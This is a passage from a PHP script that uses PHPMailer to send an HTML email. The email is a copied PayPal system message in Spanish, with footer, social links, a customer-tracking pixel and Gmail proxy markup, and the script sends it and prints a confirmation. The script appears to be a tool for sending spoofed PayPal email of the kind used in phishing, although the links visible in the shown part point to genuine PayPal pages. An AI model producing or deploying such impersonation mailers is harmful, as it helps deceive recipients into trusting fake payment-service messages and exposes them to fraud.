                                                                                        target='_blank' data-saferedirecturl='https://www.google.com/url?q=https://twitter.com/PayPal?v%3D1%252C0.1%26utm_source%3Dunp%26utm_medium%3Demail%26utm_campaign%3DRT000361%26utm_unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26ppid%3DRT000361%26cnac%3DNI%26rsta%3Des_XC%2528es-NI%2529%26cust%3DSLB4LV6UTWV7Y%26unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26calc%3D7417d485abf44%26unp_tpcid%3Dnull%26page%3Dmain%253Aemail%253ART000361%26pgrp%3Dmain%253Aemail%26e%3Dcl%26mchn%3Dem%26s%3Dci%26mail%3Dsys%26appVersion%3D1.50.0%26xt%3D104038&amp;source=gmail&amp;ust=1649153544035000&amp;usg=AOvVaw2nTKlvjXgMOMDKKpu-TGpA'><img border='0' src='https://ci5.googleusercontent.com/proxy/4qfFVV1RPmVqq9XSghFmkTaxEUROtzRDwmYm-BWwTt32PSeLOOvFPMq-SKSBY35Ko5oMEi_J27TK0PRvScPL7O4ck-56k86hTqK70qJbRaLxmfNeKIxzt88Pf7tjWDszJDXifg9Xi68_vkK1SwZuPfWNqlIGnU37XHZQ3Cw=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/icon-tw.png'
                                                                                            width='28' height='28' style='display:block' alt='Twitter' class='CToWUd'></a>
                                                                                </td>
                                                                                <td align='center' valign='middle' width='50'>
                                                                                    <a id='m_5793777658047683452instagram' href='https://www.instagram.com/paypal/?v=1%2C0.1&amp;utm_source=unp&amp;utm_medium=email&amp;utm_campaign=RT000361&amp;utm_unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;ppid=RT000361&amp;cnac=NI&amp;rsta=es_XC%28es-NI%29&amp;cust=SLB4LV6UTWV7Y&amp;unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;calc=7417d485abf44&amp;unp_tpcid=null&amp;page=main%3Aemail%3ART000361&amp;pgrp=main%3Aemail&amp;e=cl&amp;mchn=em&amp;s=ci&amp;mail=sys&amp;appVersion=1.50.0&amp;xt=104038'
                                                                                        target='_blank' data-saferedirecturl='https://www.google.com/url?q=https://www.instagram.com/paypal/?v%3D1%252C0.1%26utm_source%3Dunp%26utm_medium%3Demail%26utm_campaign%3DRT000361%26utm_unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26ppid%3DRT000361%26cnac%3DNI%26rsta%3Des_XC%2528es-NI%2529%26cust%3DSLB4LV6UTWV7Y%26unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26calc%3D7417d485abf44%26unp_tpcid%3Dnull%26page%3Dmain%253Aemail%253ART000361%26pgrp%3Dmain%253Aemail%26e%3Dcl%26mchn%3Dem%26s%3Dci%26mail%3Dsys%26appVersion%3D1.50.0%26xt%3D104038&amp;source=gmail&amp;ust=1649153544035000&amp;usg=AOvVaw1cOWJiYo71bANUc0BffaS2'><img border='0' src='https://ci4.googleusercontent.com/proxy/bmJBXMhbrdGTcSBjeP9MgRW42x9qzdkPY7qF2No7LtRRPoRt_cSgJ_iTXfzckIXZj2GaEnF8rYxJV4mQkK1zV-3_U0MoYHEqk_ptz4BJhNVS1RVMfC_vQ-d7ezpt_uOxTXh-peBilOv1fjMkdFTy_fpLfs-O0Hi911jFRbw=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/icon-ig.png'
                                                                                            width='28' height='28' style='display:block' alt='Instagram' class='CToWUd'></a>
                                                                                </td>
                                                                                <td align='center' valign='middle' width='50'>
                                                                                    <a id='m_5793777658047683452facebook' href='https://www.facebook.com/PayPalUSA?v=1%2C0.1&amp;utm_source=unp&amp;utm_medium=email&amp;utm_campaign=RT000361&amp;utm_unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;ppid=RT000361&amp;cnac=NI&amp;rsta=es_XC%28es-NI%29&amp;cust=SLB4LV6UTWV7Y&amp;unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;calc=7417d485abf44&amp;unp_tpcid=null&amp;page=main%3Aemail%3ART000361&amp;pgrp=main%3Aemail&amp;e=cl&amp;mchn=em&amp;s=ci&amp;mail=sys&amp;appVersion=1.50.0&amp;xt=104038'
                                                                                        target='_blank' data-saferedirecturl='https://www.google.com/url?q=https://www.facebook.com/PayPalUSA?v%3D1%252C0.1%26utm_source%3Dunp%26utm_medium%3Demail%26utm_campaign%3DRT000361%26utm_unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26ppid%3DRT000361%26cnac%3DNI%26rsta%3Des_XC%2528es-NI%2529%26cust%3DSLB4LV6UTWV7Y%26unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26calc%3D7417d485abf44%26unp_tpcid%3Dnull%26page%3Dmain%253Aemail%253ART000361%26pgrp%3Dmain%253Aemail%26e%3Dcl%26mchn%3Dem%26s%3Dci%26mail%3Dsys%26appVersion%3D1.50.0%26xt%3D104038&amp;source=gmail&amp;ust=1649153544035000&amp;usg=AOvVaw1LF9JpXmCl1TqWpatWiAYS'><img border='0' src='https://ci4.googleusercontent.com/proxy/MFNzrqYz4U0XhJvc3ZlTlukIMeQcmxhLkm72sww2oDSD0HMaWQDCaRAiOaSKQpjvPw2ugiZs7RYecQoV5PHQgw6Wyf4LgsarvzMMYUD4T3P-qmd4PFApYNZFZngCarUgD5EuGFwgiOBqm7xMbQWRCtXBefiMaaZ1VHLN1gI=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/icon-fb.png'
                                                                                            width='28' height='28' style='display:block' alt='Facebook' class='CToWUd'></a>
                                                                                </td>
                                                                                <td align='center' valign='middle' width='50'>
                                                                                    <a id='m_5793777658047683452linkedin' href='http://www.linkedin.com/company/1482?trk=tyah&amp;v=1&amp;utm_source=unp&amp;utm_medium=email&amp;utm_campaign=RT000361&amp;utm_unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;ppid=RT000361&amp;cnac=NI&amp;rsta=es_XC%28es-NI%29&amp;cust=SLB4LV6UTWV7Y&amp;unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;calc=7417d485abf44&amp;unp_tpcid=null&amp;page=main%3Aemail%3ART000361&amp;pgrp=main%3Aemail&amp;e=cl&amp;mchn=em&amp;s=ci&amp;mail=sys&amp;appVersion=1.50.0&amp;xt=104038'
                                                                                        target='_blank' data-saferedirecturl='https://www.google.com/url?q=http://www.linkedin.com/company/1482?trk%3Dtyah%26v%3D1%26utm_source%3Dunp%26utm_medium%3Demail%26utm_campaign%3DRT000361%26utm_unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26ppid%3DRT000361%26cnac%3DNI%26rsta%3Des_XC%2528es-NI%2529%26cust%3DSLB4LV6UTWV7Y%26unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26calc%3D7417d485abf44%26unp_tpcid%3Dnull%26page%3Dmain%253Aemail%253ART000361%26pgrp%3Dmain%253Aemail%26e%3Dcl%26mchn%3Dem%26s%3Dci%26mail%3Dsys%26appVersion%3D1.50.0%26xt%3D104038&amp;source=gmail&amp;ust=1649153544035000&amp;usg=AOvVaw36oR92AdWYlNFC6nHNg35_'><img border='0' src='https://ci6.googleusercontent.com/proxy/aqZyYIHlLYUtGyUHNy-d-RSwU1GTg1J8SLj-FrzG-948ki1N08WlFyo_W7BUed-JVMt7EzByN13vrEqORA4IeKEjiJaHpAOL2Ps_vsVxCgfD9xLcKtqxSPMEC8xr5k5isTS0fKM_-WT4q8ugnNDi2cmd8H3tgPC6HyBuDBs=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/icon-li.png'
                                                                                            width='28' height='28' style='display:block' alt='LinkedIn' class='CToWUd'></a>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </td>
                                                <td></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table cellpadding='0' cellspacing='0' border='0' width='100%' style='padding-bottom:20px'>
                                        <tbody>
                                            <tr>
                                                <td>&nbsp;</td>
                                                <td align='center' width='600'>
                                                    <table id='m_5793777658047683452hideForTextFooter' width='100%' cellpadding='0' cellspacing='0' border='0'>
                                                        <tbody>
                                                            <tr>
                                                                <td style='font-size:13px;line-height:20px;color:#687173;padding:10px 30px 10px 30px'>
                                                                    <p style='font-size:13px;margin:0' dir='ltr'><span>PayPal tiene el compromiso de prevenir los correos electronicos fraudulentos. Los correos electronicos de PayPal siempre contienen su nombre completo. <a href='https://www.paypal.com/us/webapps/mpp/security/suspicious-activity?v=1&amp;utm_source=unp&amp;utm_medium=email&amp;utm_campaign=RT000361&amp;utm_unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;ppid=RT000361&amp;cnac=NI&amp;rsta=es_XC%28es-NI%29&amp;cust=SLB4LV6UTWV7Y&amp;unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;calc=7417d485abf44&amp;unp_tpcid=null&amp;page=main%3Aemail%3ART000361&amp;pgrp=main%3Aemail&amp;e=cl&amp;mchn=em&amp;s=ci&amp;mail=sys&amp;appVersion=1.50.0&amp;xt=104038' style='color:#0070ba;text-decoration:none' target='_blank' data-saferedirecturl='https://www.google.com/url?q=https://www.paypal.com/us/webapps/mpp/security/suspicious-activity?v%3D1%26utm_source%3Dunp%26utm_medium%3Demail%26utm_campaign%3DRT000361%26utm_unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26ppid%3DRT000361%26cnac%3DNI%26rsta%3Des_XC%2528es-NI%2529%26cust%3DSLB4LV6UTWV7Y%26unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26calc%3D7417d485abf44%26unp_tpcid%3Dnull%26page%3Dmain%253Aemail%253ART000361%26pgrp%3Dmain%253Aemail%26e%3Dcl%26mchn%3Dem%26s%3Dci%26mail%3Dsys%26appVersion%3D1.50.0%26xt%3D104038&amp;source=gmail&amp;ust=1649153544035000&amp;usg=AOvVaw1rv5RGJBN26l_94PMa8M0f'>Mas informacion sobre como identificar el phishing.</a></span></p>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <table id='m_5793777658047683452hideForTextFooter' width='100%' cellpadding='0' cellspacing='0' border='0'>
                                                        <tbody>
                                                            <tr>
                                                                <td style='font-size:13px;line-height:20px;color:#687173;padding:10px 30px 10px 30px'>
                                                                    <p style='font-size:13px;margin:0' dir='ltr'><span>No responda a este correo electronico. Para ponerse en contacto con nosotros, haga clic en <strong><a href='https://www.paypal.com/selfhelp/home?v=1&amp;utm_source=unp&amp;utm_medium=email&amp;utm_campaign=RT000361&amp;utm_unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;ppid=RT000361&amp;cnac=NI&amp;rsta=es_XC%28es-NI%29&amp;cust=SLB4LV6UTWV7Y&amp;unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;calc=7417d485abf44&amp;unp_tpcid=null&amp;page=main%3Aemail%3ART000361&amp;pgrp=main%3Aemail&amp;e=cl&amp;mchn=em&amp;s=ci&amp;mail=sys&amp;appVersion=1.50.0&amp;xt=104038' style='color:#0070ba;text-decoration:none' target='_blank' data-saferedirecturl='https://www.google.com/url?q=https://www.paypal.com/selfhelp/home?v%3D1%26utm_source%3Dunp%26utm_medium%3Demail%26utm_campaign%3DRT000361%26utm_unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26ppid%3DRT000361%26cnac%3DNI%26rsta%3Des_XC%2528es-NI%2529%26cust%3DSLB4LV6UTWV7Y%26unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26calc%3D7417d485abf44%26unp_tpcid%3Dnull%26page%3Dmain%253Aemail%253ART000361%26pgrp%3Dmain%253Aemail%26e%3Dcl%26mchn%3Dem%26s%3Dci%26mail%3Dsys%26appVersion%3D1.50.0%26xt%3D104038&amp;source=gmail&amp;ust=1649153544035000&amp;usg=AOvVaw0mSgjWjawp9n_jlJFR1RN6'>Ayuda &amp; contactar</a></strong>.</span></p>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <table id='m_5793777658047683452' width='100%' cellpadding='0' cellspacing='0' border='0'>
                                                        <tbody>
                                                            <tr>
                                                                <td style='font-size:13px;line-height:20px;color:#687173;padding:10px 30px 10px 30px'>
                                                                    <p style='font-size:13px;margin:0' dir='ltr'><span>¿No esta seguro de por que recibio este correo electronico? <a href='https://www.paypal.com/ni/smarthelp/article/why-am-i-receiving-emails-from-paypal-when-i-dont-have-an-account-faq4172?v=1&amp;utm_source=unp&amp;utm_medium=email&amp;utm_campaign=RT000361&amp;utm_unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;ppid=RT000361&amp;cnac=NI&amp;rsta=es_XC%28es-NI%29&amp;cust=SLB4LV6UTWV7Y&amp;unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;calc=7417d485abf44&amp;unp_tpcid=null&amp;page=main%3Aemail%3ART000361&amp;pgrp=main%3Aemail&amp;e=cl&amp;mchn=em&amp;s=ci&amp;mail=sys&amp;appVersion=1.50.0&amp;xt=104038' style='color:#0070ba;text-decoration:none' target='_blank' data-saferedirecturl='https://www.google.com/url?q=https://www.paypal.com/ni/smarthelp/article/why-am-i-receiving-emails-from-paypal-when-i-dont-have-an-account-faq4172?v%3D1%26utm_source%3Dunp%26utm_medium%3Demail%26utm_campaign%3DRT000361%26utm_unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26ppid%3DRT000361%26cnac%3DNI%26rsta%3Des_XC%2528es-NI%2529%26cust%3DSLB4LV6UTWV7Y%26unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26calc%3D7417d485abf44%26unp_tpcid%3Dnull%26page%3Dmain%253Aemail%253ART000361%26pgrp%3Dmain%253Aemail%26e%3Dcl%26mchn%3Dem%26s%3Dci%26mail%3Dsys%26appVersion%3D1.50.0%26xt%3D104038&amp;source=gmail&amp;ust=1649153544035000&amp;usg=AOvVaw1k2XDvcxq4pqADt3shT3ao'>Obtener mas informacion</a></span></p>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <table width='100%' cellpadding='0' cellspacing='0' border='0'>
                                                        <tbody>
                                                            <tr>
                                                                <td style='font-size:13px;line-height:20px;color:#687173;padding:10px 30px 10px 30px'>
                                                                    <p style='font-size:13px;margin:0' dir='ltr'>
                                                                    </p>
                                                                    <div style='font-size:13px' dir='ltr'><span>Copyright © 1999-2021 PayPal. Todos los derechos reservados.<br><br>Asesoria al consumidor: PayPal Pte. Ltd., titular del servicio de valor almacenado de PayPal, no requiere la aprobacion de las autoridades monetarias de Singapur. Recomendamos a los usuarios que lean los terminos y las condiciones detenidamente.</span></div>
                                                                    <p style='font-size:13px' dir='ltr'>PayPal RT000361:es_XC(es-NI):1.0.0:<wbr>7417d485abf44</p><img alt='' height='1' width='1' border='0' src='https://ci5.googleusercontent.com/proxy/AvlUIE00i12uwAkm9AcUGVlme_tj8rRwfzzlV5Spb6krAQwmJ23FUY2FP-TArYRfYNw8l4iwt3-IO1eJUD2603ZA3f6ZxWYJaC4pBUd9F07iEfCENcQ5ntJaDrHfOBd6-Xu17yWejHEN0GkbQFK-PYvApVZovVTXbh-TPiA89dtr3eWy7KsvE_nqsvMNS07hfildMe5Of76muhdP4gbrD17UpRDY6jNuT_wOMF2f2-Y9sqSXs4PhDLj0sXrPAIq5qcsOaBnAjSDhoa5iDXLLoZMMT2KosoYL7EIfirDAe51qpIpXG4jUw2ghPbW2biiE7rbedfQisPSFreD7EtXR3FYs7IJxY1W7OyIYK4qHFEiMELzW08AKeyMMzXaD5Y2EzZ7Z6RILGrQIcz_ta0lWtwmp8aB_kbZenKOmsuC1pxoiFnFtpSmI4GsMGS_DBHRLB4M9oFNbABt_eYS7bobQs4_HNJivapXoZbYxKr8cH671YVKkt4Ds-aRAabTOrAkubzOwz1Jkr_A=s0-d-e1-ft#https://t.paypal.com/ts?v=1&amp;utm_source=unp&amp;utm_medium=email&amp;utm_campaign=RT000361&amp;utm_unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;ppid=RT000361&amp;cnac=NI&amp;rsta=es_XC%28es-NI%29&amp;cust=SLB4LV6UTWV7Y&amp;unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;calc=7417d485abf44&amp;unp_tpcid=null&amp;page=main%3Aemail%3ART000361&amp;pgrp=main%3Aemail&amp;e=op&amp;mchn=em&amp;s=ci&amp;mail=sys&amp;appVersion=1.50.0&amp;xt=104038'
                                                                        class='CToWUd'>
                                                                    <p></p>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </td>
                                                <td>&nbsp;</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </td>
                                <td bgcolor='#ffffff' style='font-size:0px'></td>
                            </tr>
                        </tbody>
                    </table>
                    <div class='yj6qo'></div>
                    <div class='adL'>
                    </div>
                </div>
                <div class='adL'>
    
                </div>
            </div>
        </div>
        <div id=':465' class='ii gt' style='display:none'>
            <div id=':466' class='a3s aiL '></div>
        </div>
        <div class='hi'></div>
    </div>";
    $mail->AltBody = "1";

    $mail->send();
    echo 'Mensaje enviado';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}

?>




